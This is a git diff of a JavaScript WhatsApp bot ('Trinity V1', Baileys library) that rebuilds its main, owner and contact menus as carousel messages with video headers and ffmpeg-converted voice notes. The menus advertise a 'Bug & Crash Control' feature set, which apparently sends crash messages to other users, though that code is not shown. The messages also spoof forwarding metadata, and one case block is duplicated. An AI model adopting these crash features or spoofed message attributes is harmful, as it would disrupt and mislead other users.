+                  newsletterName: "𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫",
+                  serverMessageId: 145
+                }
+              },
+
+              body: proto.Message.InteractiveMessage.Body.create({
+                text: tsm
+              }),
+
+              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                cards: [
+                  {
+                    header: proto.Message.InteractiveMessage.Header.create({
+                      title: "",
+                      gifPlayback: true,
+                      hasMediaAttachment: true,
+                      ...imgMedia
+                    }),
+
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                      text: all
+                    }),
+
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                      messageParamsJson: JSON.stringify({
+                        limited_time_offer: {
+                          text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
+                          url: "https://t.me",
+                          copy_code: "𝐕𝟏",
+                          expiration_time: Date.now() + 86400000
+                        },
+                        bottom_sheet: {
+                          in_thread_buttons_limit: 0, // Mengunci angka 0 agar semua tombol rapi bersembunyi di dalam panel list
+                          list_title: "Trinity Main Menu",
+                          button_title: "© V1" // Nama tombol picu luar card asli bawaan kamu
+                        }
+                      }),
+                    
+                      // FIX TOTAL NAMA BUTTON: Dikembalikan murni sesuai nama menu asli bawaan kamu tanpa diubah
+                      buttons: [
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "All Menu",
+                            id: ".allmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Bug Menu",
+                            id: ".bugmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Owner Menu",
+                            id: ".ownermenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Fun Menu",
+                            id: ".funmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "Cpanel Menu",
+                            id: ".cpanelmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Nsfw Menu",
+                            id: ".nsfwmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Thanks To",
+                            id: ".tqto"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Script",
+                            id: ".script"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "Developer",
+                            id: ".owner"
+                          })
+                        }
+                      ]
+                    })
+                  }
+                ]
+              })
+            })
+          }
+        }
+      },
+      { quoted: qkontak }
+    )
+
+    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
+
+    const input = "./image/ngentotlu.mp3"
+    const output = path.join(
+      __dirname,
+      "./tmp_convert_" + Date.now() + ".ogg"
+    )
+
+    if (fs.existsSync(input)) {
+      try {
+        await new Promise((resolve, reject) => {
+          exec(
+            `ffmpeg -y -i "${input}" -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k "${output}"`,
+            (err) => {
+              return err ? reject(err) : resolve()
+            }
+          )
+        })
+
+        await Asepp.sendMessage(
+          m.chat,
+          {
+            audio: fs.readFileSync(output),
+            mimetype: "audio/ogg; codecs=opus",
+            ptt: true,
+            contextInfo: {
+              forwardingScore: 0,
+              isForwarded: false
+            }
+          },
+          {
+            quoted: qkontak
+          }
+        )
+
+      } finally {
+        if (fs.existsSync(output)) {
+          fs.unlinkSync(output)
+        }
+      }
+    }
+
+  } catch (err) {
+    console.log(err)
+    payreply(`${err}`)
+  }
+}
+break
+
+case "V1":
+case "x1": {
+  try {
+    const {
+      generateWAMessageFromContent,
+      proto,
+      prepareWAMessageMedia
+    } = require("@whiskeysockets/baileys")
+
+    const moment = require("moment-timezone")
+    const fs = require("fs")
+    const path = require("path")
+    const { exec } = require("child_process")
+    const os = require("os")
+
+    const waktu = moment().tz("Asia/Jakarta")
+    const Hari = waktu.format("dddd")
+    const Tanggal = waktu.format("DD MMMM YYYY")
+    const Jam = waktu.format("HH:mm:ss")
+
+    const hariIndo = {
+      Sunday: "Minggu",
+      Monday: "Senin",
+      Tuesday: "Selasa",
+      Wednesday: "Rabu",
+      Thursday: "Kamis",
+      Friday: "Jumat",
+      Saturday: "Sabtu"
+    }
+
+    const HariIndonesia = hariIndo[Hari]
+
+    const totalMem = os.totalmem()
+    const freeMem = os.freemem()
+    const usedMem = totalMem - freeMem
+
+    const formatBytes = (bytes) => {
+      if (bytes === 0) return "0 Bytes"
+
+      const k = 1024
+      const sizes = ["Bytes", "KB", "MB", "GB"]
+      const i = Math.floor(Math.log(bytes) / Math.log(k))
+
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
+    }
+
+    const formattedUsedMem = formatBytes(usedMem)
+    const formattedTotalMem = formatBytes(totalMem)
+
+    await Asepp.sendMessage(m.chat, {
+      react: {
+        text: "👑",
+        key: m.key
+      }
+    })
+
+    let tsm = `𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨`
+
+    let all = `*Hallo.. ${pushname}* 👋
+Welcome to \`Trinity V1\` WhatsApp Assistant.  
+Use the bot wisely and enjoy all available features ✨
+
+▢ *./Information.js_*
+└────
+│ ├─ »» Bot Name ☇ *Trinity*
+│ ├─ »» Owner ☇ *All Partner Spesial*
+│ ├─ »» Developer ☇ *Asepp*
+│ ├─ »» Version ☇ *V1*
+│ ├─ »» Language ☇ *JavaScript*
+│ ├─ »» Bot Mode ☇ *${Asepp.public ? "Public" : "Self"}*
+│ ├─ »» Runtime ☇ *${runtime(process.uptime())}*
+│ ├─ »» Memory ☇ *${formattedUsedMem} / ${formattedTotalMem}*
+│ ├─ »» User ☇ *${pushname}*
+│ └────
+
+▢ *./DateTime.js_*
+└────
+│ ├─ »» Hari ☇ *${HariIndonesia}*
+│ ├─ »» Tanggal ☇ *${Tanggal}*
+│ ├─ »» Jam ☇ *${Jam} WIB*
+│ └────
+
+▢ *./SupportSystem.js_*
+└────
+│ ├─ »» Ditchi ☇ *Friends*
+│ ├─ »» Kelpin ☇ *Friends*
+│ ├─ »» Trinity User ☇ *Support*
+│ ├─ »» All Partner ☇ *Support*
+│ └────
+
+▢ *./OwnerSosmed.js_*
+└────
+│ ├─ »» TikTok ☇ *tiktok.com/@asepppxyz*
+│ ├─ »» Telegram ☇ *t.me/AsepXxnx*
+│ └────`
+
+    // Menyiapkan biner video background untuk Carousel Card agar loop play permanen
+    const imgMedia = await prepareWAMessageMedia(
+      {
+        video: {
+          url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780594025507.mp4"
+        },
+        gifPlayback: true
+      },
+      {
+        upload: Asepp.waUploadToServer
+      }
+    )
+
+    let msg = await generateWAMessageFromContent(
+      m.chat,
+      {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {}, deviceListMetadataVersion: 2
+            },
+
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+              contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 999999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: "120363418538598013@newsletter",
+                  newsletterName: "𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫",
+                  serverMessageId: 145
+                }
+              },
+
+              body: proto.Message.InteractiveMessage.Body.create({
+                text: tsm
+              }),
+
+              // SINKRONISASI CAROUSEL MESSAGE CARD
+              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                cards: [
+                  {
+                    // FIX PERMANENT AUTO-PLAY: Parameter gifPlayback dikunci nempel di Header Card
+                    header: proto.Message.InteractiveMessage.Header.create({
+                      title: "",
+                      gifPlayback: true,
+                      hasMediaAttachment: true,
+                      ...imgMedia
+                    }),
+
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                      text: all
+                    }),
+
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                      messageParamsJson: JSON.stringify({
+                        limited_time_offer: {
+                          text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
+                          url: "https://t.me/AsepXxnx",
+                          copy_code: "𝐕𝟏",
+                          expiration_time: Date.now() + 86400000
+                        },
+                        bottom_sheet: {
+                          in_thread_buttons_limit: 0, // Mengunci angka 0 agar semua tombol rapi bersembunyi di dalam list pop-up panel
+                          list_title: "Trinity Main Hub",
+                          button_title: "Open Menu Center" // Nama tombol picu luar card
+                        }
+                      }),
+                    
+                      // MODIFIKASI RE-NAME BUTTON: Menjadi sistem quick_reply berjejer berikon variatif
+                      buttons: [
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "All Menu",
+                            id: ".allmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Bug & Crash Control",
+                            id: ".bugmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Owner Command Panel",
+                            id: ".ownermenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Entertainment System",
+                            id: ".funmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "Cpanel Server Manage",
+                            id: ".cpanelmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Adult Database 18+",
+                            id: ".nsfwmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Credit & Special Thanks",
+                            id: ".tqto"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Source Code Information",
+                            id: ".script"
+                          })
+                        },
+                        {
+                          name: "cta_url",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "CALL",
+                            display_text: "Contact Core Developer",
+                            url: "https://t.me/AsepXxnx"
+                          })
+                        }
+                      ]
+                    })
+                  }
+                ]
+              })
+            })
+          }
+        }
+      },
+      { quoted: qkontak } // Memindahkan quote target ke parameter generateWAMessage agar tidak crash biner
+    )
+
+    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
+
+    const input = "./image/ngentotlu.mp3"
+    const output = path.join(
+      __dirname,
+      "./tmp_convert_" + Date.now() + ".ogg"
+    )
+
+    if (fs.existsSync(input)) {
+      try {
+        await new Promise((resolve, reject) => {
+          exec(
+            `ffmpeg -y -i "${input}" -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k "${output}"`,
+            (err) => {
+              return err ? reject(err) : resolve()
+            }
+          )
+        })
+
+        await Asepp.sendMessage(
+          m.chat,
+          {
+            audio: fs.readFileSync(output),
+            mimetype: "audio/ogg; codecs=opus",
+            ptt: true,
+            contextInfo: {
+              forwardingScore: 0,
+              isForwarded: false
+            }
+          },
+          {
+            quoted: qkontak
+          }
+        )
+
+      } finally {
+        if (fs.existsSync(output)) {
+          fs.unlinkSync(output)
+        }
+      }
+    }
+
+  } catch (err) {
+    console.log(err)
+    payreply(`${err}`)
+  }
+}
+break
+
+case "V1":
+case "x1": {
+  try {
+    const {
+      generateWAMessageFromContent,
+      proto,
+      prepareWAMessageMedia
+    } = require("@whiskeysockets/baileys")
+
+    const moment = require("moment-timezone")
+    const fs = require("fs")
+    const path = require("path")
+    const { exec } = require("child_process")
+    const os = require("os")
+
+    const waktu = moment().tz("Asia/Jakarta")
+    const Hari = waktu.format("dddd")
+    const Tanggal = waktu.format("DD MMMM YYYY")
+    const Jam = waktu.format("HH:mm:ss")
+
+    const hariIndo = {
+      Sunday: "Minggu",
+      Monday: "Senin",
+      Tuesday: "Selasa",
+      Wednesday: "Rabu",
+      Thursday: "Kamis",
+      Friday: "Jumat",
+      Saturday: "Sabtu"
+    }
+
+    const HariIndonesia = hariIndo[Hari]
+
+    const totalMem = os.totalmem()
+    const freeMem = os.freemem()
+    const usedMem = totalMem - freeMem
+
+    const formatBytes = (bytes) => {
+      if (bytes === 0) return "0 Bytes"
+
+      const k = 1024
+      const sizes = ["Bytes", "KB", "MB", "GB"]
+      const i = Math.floor(Math.log(bytes) / Math.log(k))
+
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
+    }
+
+    const formattedUsedMem = formatBytes(usedMem)
+    const formattedTotalMem = formatBytes(totalMem)
+
+    await Asepp.sendMessage(m.chat, {
+      react: {
+        text: "👑",
+        key: m.key
+      }
+    })
+
+    let tsm = `𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨`
+
+    let all = `*Hallo.. ${pushname}* 👋
+Welcome to \`Trinity V1\` WhatsApp Assistant.  
+Use the bot wisely and enjoy all available features ✨
+
+▢ *./Information.js_*
+└────
+│ ├─ »» Bot Name ☇ *Trinity*
+│ ├─ »» Owner ☇ *All Partner Spesial*
+│ ├─ »» Developer ☇ *Asepp*
+│ ├─ »» Version ☇ *V1*
+│ ├─ »» Language ☇ *JavaScript*
+│ ├─ »» Bot Mode ☇ *${Asepp.public ? "Public" : "Self"}*
+│ ├─ »» Runtime ☇ *${runtime(process.uptime())}*
+│ ├─ »» Memory ☇ *${formattedUsedMem} / ${formattedTotalMem}*
+│ ├─ »» User ☇ *${pushname}*
+│ └────
+
+▢ *./DateTime.js_*
+└────
+│ ├─ »» Hari ☇ *${HariIndonesia}*
+│ ├─ »» Tanggal ☇ *${Tanggal}*
+│ ├─ »» Jam ☇ *${Jam} WIB*
+│ └────
+
+▢ *./SupportSystem.js_*
+└────
+│ ├─ »» Ditchi ☇ *Friends*
+│ ├─ »» Kelpin ☇ *Friends*
+│ ├─ »» Trinity User ☇ *Support*
+│ ├─ »» All Partner ☇ *Support*
+│ └────
+
+▢ *./OwnerSosmed.js_*
+└────
+│ ├─ »» TikTok ☇ *tiktok.com/@asepppxyz*
+│ ├─ »» Telegram ☇ *t.me/AsepXxnx*
+│ └────`
+
+    let msg = await generateWAMessageFromContent(
+      m.chat,
+      {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 2
+            },
+
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+              contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 999999,
+                isForwarded: true,
+
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: "120363418538598013@newsletter",
+                  newsletterName: "𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫",
+                  serverMessageId: 145
+                }
+              },
+
+              body: proto.Message.InteractiveMessage.Body.create({
+                text: tsm
+              }),
+
+              footer: proto.Message.InteractiveMessage.Footer.create({
+                text: all
+              }),
+
+              header: proto.Message.InteractiveMessage.Header.create({
+                title: "",
+                gifPlayback: true,
+                hasMediaAttachment: true,
+
+                ...(await prepareWAMessageMedia(
+                  {
+                    video: {
+                      url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780594025507.mp4"
+                    },
+                    gifPlayback: true
+                  },
+                  {
+                    upload: Asepp.waUploadToServer
+                  }
+                ))
+              }),
+            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                messageParamsJson: JSON.stringify({
+                  limited_time_offer: {
+                                    text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
+                                    url: "https://t.me/AsepXxnx",
+                                    copy_code: "𝐕𝟏",
+                                    expiration_time: Date.now() * 999
+                                },
+
+                  bottom_sheet: {
+                    in_thread_buttons_limit: 2,
+                    divider_indices: Array(5).fill(0).map((_, i) => i),
+                    list_title: "Trinity Main Menu",
+                    button_title: "© V1"
+                  }
+                }),
+              
+                buttons: [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: JSON.stringify({
+                      has_multiple_buttons: true,
+                      icon: "DOCUMENT",
+                      title: "𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔",
+                      sections: [
+                        {
+                          title: "❏ 𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐌𝐄𝐍𝐔 𝐋𝐈𝐒𝐓",
+                          highlight_label: "Top Feature 🚀",
+
+                          rows: [
+                            {
+                              title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
+                              description: "Display all available bot features",
+                              id: ".allmenu"
+                            },
+                            {
+                              title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
+                              description: "Display bug & crash features",
+                              id: ".bugmenu"
+                            },
+                            {
+                              title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
+                              description: "Display owner control features",
+                              id: ".ownermenu"
+                            },
+                            {
+                              title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮",
+                              description: "Display fun & entertainment features",
+                              id: ".funmenu"
+                            },
+                            {
+                              title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮",
+                              description: "Display cpanel management features",
+                              id: ".cpanelmenu"
+                            },
+                            {
+                              title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮",
+                              description: "Display 18+ special features",
+                              id: ".nsfwmenu"
+                            },
+                            {
+                              title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨",
+                              description: "Display support & credits",
+                              id: ".tqto"
+                            },
+                            {
+                              title: "𝐒𝐜𝐫𝐢𝐩𝐭",
+                              description: "Display script information",
+                              id: ".script"
+                            },
+                            {
+                              title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
+                              description: "Display developer contact",
+                              id: ".owner"
+                            }
+                          ]
+                        }
+                      ]
+                    })
+                  },
+
+                  {
+                    name: "cta_url",
+                    buttonParamsJson: JSON.stringify({
+                      display_text: "Telegram",
+                      url: "https://t.me/AsepXxnx"
+                    })
+                  },
+
+                  {
+                    name: "cta_url",
+                    buttonParamsJson: JSON.stringify({
+                      display_text: "🎵 TikTok",
+                      url: "https://tiktok.com/@asepppxyz"
+                    })
+                  }
+                ]
+              })
+            })
+          }
+        }
+      },
+      {}
+    )
+
+    await Asepp.relayMessage(
+      m.chat,
+      msg.message,
+      {
+        messageId: msg.key.id,
+        quoted: qkontak
+      }
+    )
+
+    const input = "./image/ngentotlu.mp3"
+    const output = path.join(
+      __dirname,
+      "./tmp_convert_" + Date.now() + ".ogg"
+    )
+
+    if (fs.existsSync(input)) {
+      try {
+        await new Promise((resolve, reject) => {
+          exec(
+            `ffmpeg -y -i ${input} -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k ${output}`,
+            (err) => {
+              return err ? reject(err) : resolve()
+            }
+          )
+        })
+
+        await Asepp.sendMessage(
+          m.chat,
+          {
+            audio: fs.readFileSync(output),
+            mimetype: "audio/ogg; codecs=opus",
+            ptt: true,
+
+            contextInfo: {
+              forwardingScore: 0,
+              isForwarded: false
+            }
+          },
+          {
+            quoted: qkontak
+          }
+        )
+
+      } finally {
+        if (fs.existsSync(output)) {
+          fs.unlinkSync(output)
+        }
+      }
+    }
+
+  } catch (err) {
+    console.log(err)
+    payreply(`${err}`)
+  }
+}
+break
+                
+
+                
+
 case "ownermenu": {
   try {
     const {
@@ -3021,6 +4582,19 @@ Thank you for using \`Trinity V1\` WhatsApp Assistant ✨
 │ ├─ »» All User ☇ *Support*
 │ └────`
 
+    // Mengunci link video direct MP4 sesuai request kamu, Bro!
+    const imgMedia = await prepareWAMessageMedia(
+      {
+        video: {
+          url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780248958378.mp4"
+        },
+        gifPlayback: true
+      },
+      {
+        upload: Asepp.waUploadToServer
+      }
+    )
+
     let msg = await generateWAMessageFromContent(
       m.chat,
       {
@@ -3048,117 +4622,104 @@ Thank you for using \`Trinity V1\` WhatsApp Assistant ✨
                 text: tsm
               }),
 
-              footer: proto.Message.InteractiveMessage.Footer.create({
-                text: all
-              }),
-
-              header: proto.Message.InteractiveMessage.Header.create({
-                title: "",
-                gifPlayback: true,
-                hasMediaAttachment: true,
-
-                ...(await prepareWAMessageMedia(
+              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                cards: [
                   {
-                    video: {
-                      url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780248958378.mp4"
-                    },
-                    gifPlayback: true
-                  },
-                  {
-                    upload: Asepp.waUploadToServer
-                  }
-                ))
-              }),
+                    // Menjaga video tetap loop putar otomatis di background secara permanen
+                    header: proto.Message.InteractiveMessage.Header.create({
+                      title: "",
+                      gifPlayback: true,
+                      hasMediaAttachment: true,
+                      ...imgMedia
+                    }),
 
-              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                messageParamsJson: JSON.stringify({
-                  limited_time_offer: {
-                                    text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
-                                    url: "https://t.me/AsepXxnx",
-                                    copy_code: "𝐕𝟏",
-                                    expiration_time: Date.now() * 999
-                                },
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                      text: all
+                    }),
 
-                  bottom_sheet: {
-                    in_thread_buttons_limit: 2,
-                    divider_indices: Array(5).fill(0).map((_, i) => i),
-                    list_title: "Trinity Thanks To",
-                    button_title: "© V1"
-                  }
-                }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                      messageParamsJson: JSON.stringify({
+                        limited_time_offer: {
+                          text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
+                          url: "https://t.me", // FIX: Link Telegram t.me/AsepXxnx
+                          copy_code: "𝐕𝟏",
+                          expiration_time: Date.now() + 86400000
+                        },
 
-                buttons: [
-                  {
-                    name: "single_select",
-                    buttonParamsJson: JSON.stringify({
-                      has_multiple_buttons: true,
-                      icon: "DOCUMENT",
-                      title: "𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔",
-                      sections: [
+                        bottom_sheet: {
+                          in_thread_buttons_limit: 1, // FIX: Dikunci ke angka 1 agar semua menu rapi bersembunyi di dalam panel pop-up
+                          divider_indices: [],
+                          list_title: "Trinity Menu List",
+                          button_title: "Open Menu" // Nama tombol picu luar card
+                        }
+                      }),
+
+                      buttons: [
                         {
-                          title: "❏ 𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐒𝐔𝐏𝐏𝐎𝐑𝐓",
-                          highlight_label: "Top Feature 🚀",
-
-                          rows: [
-                            {
-                              title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
-                              description: "Display all available bot features",
-                              id: ".allmenu"
-                            },
-                            {
-                              title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
-                              description: "Display bug & crash features",
-                              id: ".bugmenu"
-                            },
-                            {
-                              title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
-                              description: "Display owner control features",
-                              id: ".ownermenu"
-                            },
-                            {
-                              title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮",
-                              description: "Display fun & entertainment features",
-                              id: ".funmenu"
-                            },
-                            {
-                              title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮",
-                              description: "Display cpanel management features",
-                              id: ".cpanelmenu"
-                            },
-                            {
-                              title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮",
-                              description: "Display 18+ special features",
-                              id: ".nsfwmenu"
-                            },
-                            {
-                              title: "𝐒𝐜𝐫𝐢𝐩𝐭",
-                              description: "Display script information",
-                              id: ".script"
-                            },
-                            {
-                              title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
-                              description: "Display developer contact",
-                              id: ".owner"
-                            }
-                          ]
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "All Menu",
+                            id: ".allmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Bug Menu",
+                            id: ".bugmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Owner Menu",
+                            id: ".ownermenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Fun Menu",
+                            id: ".funmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "Cpanel Menu",
+                            id: ".cpanelmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Nsfw Menu",
+                            id: ".nsfwmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Script Info",
+                            id: ".script"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Developer Contact",
+                            id: ".owner"
+                          })
                         }
                       ]
-                    })
-                  },
-
-                  {
-                    name: "cta_url",
-                    buttonParamsJson: JSON.stringify({
-                      display_text: "Telegram",
-                      url: "https://t.me/AsepXxnx"
-                    })
-                  },
-
-                  {
-                    name: "cta_url",
-                    buttonParamsJson: JSON.stringify({
-                      display_text: "TikTok",
-                      url: "https://tiktok.com/@asepppxyz"
                     })
                   }
                 ]
@@ -3167,17 +4728,10 @@ Thank you for using \`Trinity V1\` WhatsApp Assistant ✨
           }
         }
       },
-      {}
+      { quoted: qkontak }
     )
 
-    await Asepp.relayMessage(
-      m.chat,
-      msg.message,
-      {
-        messageId: msg.key.id,
-        quoted: qkontak
-      }
-    )
+    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
 
     const input = "./image/bego.mp3"
     const output = path.join(
@@ -3189,7 +4743,7 @@ Thank you for using \`Trinity V1\` WhatsApp Assistant ✨
       try {
         await new Promise((resolve, reject) => {
           exec(
-            `ffmpeg -y -i ${input} -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k ${output}`,
+            `ffmpeg -y -i "${input}" -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k "${output}"`,
             (err) => {
               return err ? reject(err) : resolve()
             }
@@ -3202,7 +4756,6 @@ Thank you for using \`Trinity V1\` WhatsApp Assistant ✨
             audio: fs.readFileSync(output),
             mimetype: "audio/ogg; codecs=opus",
             ptt: true,
-
             contextInfo: {
               forwardingScore: 0,
               isForwarded: false
@@ -3227,9 +4780,7 @@ Thank you for using \`Trinity V1\` WhatsApp Assistant ✨
 }
 break
 
-
-    
-                case 'dekcjs': {
+case 'dekcjs': {
   if (!m.quoted) return payreply(`Reply file.js yang mau dibersihin pake ${prefix}dekcjs`)
 
   try {
@@ -3803,58 +5354,280 @@ case 'zenc': {
 }
 break
 case "owner": {
-await Asepp.sendMessage(m.chat, { react: { text: "👑",key: m.key,}}); 
-let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/AsepIkiCok.jpg") }, { upload: Asepp.waUploadToServer })
-const msgii = await generateWAMessageFromContent(m.chat, {
-ephemeralMessage: {
+try {
+await Asepp.sendMessage(m.chat, {
+react: {
+text: "👑",
+key: m.key
+}
+})
+
+const {
+generateWAMessageFromContent,
+prepareWAMessageMedia,
+proto
+} = require("@whiskeysockets/baileys")
+
+const videoUrl =
+"https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780748833328.mp4"
+
+const imgsc = await prepareWAMessageMedia(
+{
+video: { url: videoUrl },
+gifPlayback: true
+},
+{
+upload: Asepp.waUploadToServer
+}
+)
+const msgii = await generateWAMessageFromContent(
+m.chat,
+{
+viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
-}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
-body: proto.Message.InteractiveMessage.Body.fromObject({
-text: ``,
-}), 
-contextInfo: {}, 
+},
+
+interactiveMessage: proto.Message.InteractiveMessage.create({
+body: proto.Message.InteractiveMessage.Body.create({
+text: ""
+}),
+
+contextInfo: {
+mentionedJid: [m.sender],
+forwardingScore: 999999,
+isForwarded: true
+},
+
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
-cards: [{
+cards: [
+{
 header: proto.Message.InteractiveMessage.Header.fromObject({
-title: `\`[ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ]\`
